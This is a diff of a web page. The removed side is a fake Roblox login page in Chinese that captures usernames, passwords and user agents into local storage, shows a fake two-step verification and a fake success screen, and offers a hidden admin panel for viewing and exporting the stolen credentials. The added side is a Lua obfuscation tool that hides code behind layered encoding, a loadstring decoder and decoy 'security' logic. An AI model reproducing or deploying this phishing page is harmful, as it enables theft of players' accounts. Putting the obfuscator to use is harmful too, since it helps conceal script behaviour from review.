@@ -1,177 +1,134 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - 登录</title>
-    <style>
-        body { margin:0; padding:0; background:#000; font-family:"Gotham",Arial,sans-serif; height:100vh; display:flex; justify-content:center; align-items:center; background-image:url('https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg'); background-size:cover; background-position:center; color:#fff; }
-        .container { width:420px; background:rgba(0,0,0,0.85); padding:40px; border-radius:12px; box-shadow:0 0 40px rgba(0,0,0,0.9); }
-        .logo { text-align:center; margin-bottom:30px; }
-        .logo img { width:220px; }
-        input { width:100%; padding:14px; margin:12px 0; background:#1e1e1e; border:1px solid #444; border-radius:6px; color:#fff; font-size:16px; box-sizing:border-box; }
-        input::placeholder { color:#888; }
-        button { width:100%; padding:14px; background:#02b757; color:#fff; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.3s; }
-        button:hover { background:#019e4a; }
-        .footer { text-align:center; color:#777; font-size:12px; margin-top:25px; }
-        #adminPanel, #fakeHome, #twoFA { display:none; position:fixed; inset:0; background:#000; color:#0f0; font-family:Consolas,monospace; padding:30px; overflow:auto; z-index:9999; }
-        #adminPanel { background:#000 url('https://i.imgur.com/3jY2f7N.jpg') center/cover; }
-        h1 { text-align:center; font-size:42px; text-shadow:0 0 15px #0f0; margin:20px 0; }
-        table { width:100%; max-width:1100px; margin:20px auto; border-collapse:collapse; background:rgba(0,30,0,0.85); box-shadow:0 0 25px rgba(0,255,0,0.3); }
-        th, td { padding:14px; border:1px solid #0f0; text-align:center; font-size:16px; }
-        th { background:#003300; color:#0f0; }
-        tr:nth-child(even) { background:rgba(0,80,0,0.2); }
-        tr:hover { background:rgba(0,255,0,0.15); }
-        .btn-group { text-align:center; margin:30px 0; }
-        .action-btn { padding:12px 28px; margin:10px; border:none; border-radius:6px; cursor:pointer; font-size:18px; }
-        .export { background:#e67e22; color:#fff; }
-        .copy { background:#3498db; color:#fff; }
-        .clear { background:#c0392b; color:#fff; }
-        .exit { background:#0f0; color:#000; font-weight:bold; }
-        #twoFA form { max-width:400px; margin:100px auto; background:rgba(0,0,0,0.7); padding:30px; border-radius:10px; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>纸lua 终极加密生成器</title>
+  <style>
+    body { margin: 0; padding: 0; font-family: system-ui, sans-serif; background: #0f0f17; color: #e0e0ff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    h1 { color: #a0c0ff; margin-bottom: 20px; }
+    .main-area { width: 90%; max-width: 960px; display: flex; gap: 30px; flex-wrap: wrap; justify-content: center; }
+    .editor { flex: 1; min-width: 500px; }
+    textarea { width: 100%; height: 480px; padding: 20px; background: #141422; border: 1px solid #333355; border-radius: 10px; color: #d0d0ff; font-family: Consolas, monospace; font-size: 15px; resize: vertical; box-shadow: 0 4px 20px rgba(0,0,0,0.6); }
+    .sidebar { width: 240px; display: flex; flex-direction: column; gap: 20px; align-items: center; }
+    button, .link-btn { padding: 16px 40px; font-size: 18px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; transition: 0.25s; width: 100%; max-width: 240px; text-decoration: none; text-align: center; box-sizing: border-box; }
+    #generateBtn { background: #ae52ff; color: white; }
+    #generateBtn:hover { background: #b96bff; transform: translateY(-3px); box-shadow: 0 8px 25px rgba(174,82,255,0.4); }
+    #copyAuthorBtn { background: #ff69b4; color: white; }
+    #copyAuthorBtn:hover { background: #ff85c0; transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,105,180,0.4); }
+    .link-btn { background: #2ecc71; color: white; display: block; }
+    .link-btn:hover { background: #27ae60; transform: translateY(-3px); box-shadow: 0 8px 25px rgba(46,204,113,0.4); }
+    #msg { margin-top: 20px; font-size: 16px; color: #a0ffcc; text-align: center; width: 100%; max-width: 960px; min-height: 20px; }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">
-        <img src="https://images.rbxcdn.com/0e4d5e98e5c9b8a2ac9d4b4f5e1d6e8f.png" alt="Roblox">
+  <h1>纸lua 终极加密生成器</h1>
+
+  <div class="main-area">
+    <div class="editor">
+      <textarea id="code" placeholder="-- 粘贴你的 Lua 代码在这里
+-- 点击终极加密后会自动下载
+-- 混淆级别：极高 (反人工分析 + 虚假逻辑)"></textarea>
     </div>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="用户名或电子邮箱" autocomplete="off" required>
-        <input type="password" id="password" placeholder="密码" autocomplete="off" required>
-        <button type="submit" class="login-btn">登录</button>
-    </form>
-    <div class="footer">© 2025 Roblox Corporation. All rights reserved.</div>
-</div>
 
-<!-- 假 2FA 页面（更逼真） -->
-<div id="twoFA">
-    <h1>两步验证</h1>
-    <form id="twoFAForm">
-        <p style="text-align:center; font-size:18px; margin:20px 0;">请输入发送到你的邮箱/手机的验证码</p>
-        <input type="text" id="code" placeholder="验证码" maxlength="6" required>
-        <button type="submit">验证</button>
-    </form>
-    <p style="text-align:center; margin-top:20px;">没有收到？<a href="#" onclick="alert('已重新发送');">重新发送</a></p>
-</div>
-
-<!-- 假首页（登录成功后） -->
-<div id="fakeHome">
-    <h1>欢迎回来！</h1>
-    <p style="font-size:24px; text-align:center; margin:50px 0;">登录成功，正在跳转到 Roblox...</p>
-    <p style="text-align:center;">加载中...</p>
-    <button class="action-btn exit" onclick="location.reload()">返回登录</button>
-</div>
-
-<!-- 后台 -->
-<div id="adminPanel">
-    <h1>ROBLOX 后台管理系统</h1>
-    <p style="text-align:center; font-size:22px;">捕获记录中心 - 本地保存</p>
-    <div style="text-align:center; font-size:26px; margin:20px 0;">已捕获: <span id="totalCount">0</span> 条</div>
-    <table id="logTable">
-        <thead>
-            <tr>
-                <th>#</th>
-                <th>时间</th>
-                <th>用户名</th>
-                <th>密码</th>
-                <th>额外信息</th>
-            </tr>
-        </thead>
-        <tbody id="logBody"></tbody>
-    </table>
-    <div class="btn-group">
-        <button class="action-btn export" onclick="exportTXT()">导出 TXT</button>
-        <button class="action-btn copy" onclick="copyToClipboard()">复制全部</button>
-        <button class="action-btn clear" onclick="clearLogs()">清空记录</button>
-        <button class="action-btn exit" onclick="location.reload()">退出</button>
+    <div class="sidebar">
+      <button id="generateBtn" onclick="generate()">终极加密下载</button>
+      <button id="copyAuthorBtn" onclick="copyAuthor()">复制作者 B 站</button>
+      <a href="https://your-creation-site.com" target="_blank" class="link-btn">创造链接</a>
     </div>
-</div>
+  </div>
 
-<script>
-    let logs = JSON.parse(localStorage.getItem('rbx_logs') || '[]');
-    const tbody = document.getElementById('logBody');
-    const countEl = document.getElementById('totalCount');
+  <div id="msg"></div>
 
-    function refresh() {
-        tbody.innerHTML = '';
-        logs.forEach((log, i) => {
-            const tr = document.createElement('tr');
-            tr.innerHTML = `
-                <td>${i+1}</td>
-                <td>${log.time}</td>
-                <td style="color:yellow;">${log.user}</td>
-                <td style="color:#ff5555;">${log.pass}</td>
-                <td style="color:#aaa;">${log.extra}</td>
-            `;
-            tbody.appendChild(tr);
-        });
-        countEl.textContent = logs.length;
-    }
-    refresh();
-
-    function saveLog(user, pass) {
-        const now = new Date().toLocaleString('zh-CN', { hour12: false });
-        const extra = `浏览器: ${navigator.userAgent.slice(0,50)}... | IP: 本地`;
-        logs.push({ time: now, user: user || '(空)', pass: pass || '(空)', extra });
-        localStorage.setItem('rbx_logs', JSON.stringify(logs));
-        refresh();
+  <script>
+    // 生成虚假检查逻辑
+    function generateFakeCheck() {
+        return `
+-- [SYSTEM] 安全检查模块 (虚假逻辑)
+local _check_id = math.random(10000, 99999)
+local function secure_verify()
+    for i=1, 10 do
+        local _ = string.reverse("fakesecurity")
+        if _ == "ytirucesekaf" then
+            -- 虚假日志
+            -- print("[SECURE] Checksum valid: " .. _check_id)
+        end
+    end
+end
+secure_verify()
+`;
     }
 
-    function clearLogs() {
-        if (confirm('确定清空所有本地记录？')) {
-            logs = [];
-            localStorage.removeItem('rbx_logs');
-            refresh();
-        }
+    // 核心加密逻辑
+    function obfuscateCode(code) {
+      // 1. 字符偏移
+      let charEncoded = "";
+      for (let i = 0; i < code.length; i++) {
+        charEncoded += String.fromCharCode(code.charCodeAt(i) + 1);
+      }
+      
+      // 2. 多重 Base64
+      let b64 = btoa(unescape(encodeURIComponent(charEncoded)));
+      b64 = btoa(b64); 
+
+      // 3. 构造极度复杂的 Lua 解密器 + 假逻辑
+      return `-- 纸lua 终极混淆保护\n` +
+             `local __F = ${JSON.stringify(generateFakeCheck())}\n` +
+             `local j = function(s) local r='' for i=1,#s do r=r..string.char(s:byte(i)-1) end return r end\n` +
+             `local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n` +
+             `local d=function(data) data=string.gsub(data,'[^'..b..'=]','') return (data:gsub('.',function(x) if (x=='=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if (#x~=8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end\n` +
+             `local __ = "${b64}"\n` +
+             `local _ = j(d(d(__)))\n` +
+             `loadstring(_..__F)()\n`;
     }
 
-    function exportTXT() {
-        if (!logs.length) return alert('无记录可导出');
-        let text = 'Roblox 捕获记录\n\n';
-        logs.forEach((l, i) => text += `${i+1}. ${l.time} | 用户: ${l.user} | 密码: ${l.pass} | ${l.extra}\n`);
-        const blob = new Blob([text], {type: 'text/plain'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url; a.download = 'rbx_logs.txt'; a.click();
-        URL.revokeObjectURL(url);
+    function getNextIndex() {
+      let index = parseInt(localStorage.getItem('zhifeijiyut_index') || '0', 10);
+      index += 1;
+      localStorage.setItem('zhifeijiyut_index', index);
+      return index;
     }
 
-    function copyToClipboard() {
-        if (!logs.length) return alert('无记录可复制');
-        let text = 'Roblox 捕获记录\n\n';
-        logs.forEach((l, i) => text += `${i+1}. ${l.time} | 用户: ${l.user} | 密码: ${l.pass} | ${l.extra}\n`);
-        navigator.clipboard.writeText(text).then(() => alert('已复制到剪贴板！'));
+    function generate() {
+      const originalCode = document.getElementById('code').value.trim();
+      const msg = document.getElementById('msg');
+
+      if (!originalCode) {
+        msg.textContent = '请输入代码再生成哦～';
+        msg.style.color = '#ff7777';
+        return;
+      }
+
+      const finalCode = obfuscateCode(originalCode);
+      const index = getNextIndex();
+      let filename = `ultimate_protected_${index}.lua`;
+
+      const blob = new Blob([finalCode], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = filename;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      msg.textContent = `终极加密完成：${filename}  •  已下载`;
+      msg.style.color = '#a0ffcc';
     }
 
-    document.getElementById('loginForm').addEventListener('submit', e => {
-        e.preventDefault();
-        const user = document.getElementById('username').value.trim();
-        const pass = document.getElementById('password').value;
-        saveLog(user, pass);
+    function copyAuthor() {
+      const link = 'https://b23.tv/4DZnv9H';
+      navigator.clipboard.writeText(link).then(() => {
+        const msg = document.getElementById('msg');
+        msg.textContent = '已复制作者 B 站主页：' + link;
+        msg.style.color = '#ff69b4';
+        setTimeout(() => { msg.textContent = ''; }, 5000);
+      });
+    }
+  </script>
 
-        if (user === 'adminopen' && pass === 'adminopen') {
-            document.getElementById('twoFA').style.display = 'block';  // 先跳 2FA
-        } else {
-            alert('用户名或密码错误！');
-        }
-    });
-
-    document.getElementById('twoFAForm').addEventListener('submit', e => {
-        e.preventDefault();
-        const code = document.getElementById('code').value;
-        if (code.length === 6) {  // 随便验证
-            document.getElementById('twoFA').style.display = 'none';
-            document.getElementById('fakeHome').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('fakeHome').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-            }, 3000);  // 假跳转后进后台
-        } else {
-            alert('验证码错误！');
-        }
-    });
-</script>
 </body>
 </html>
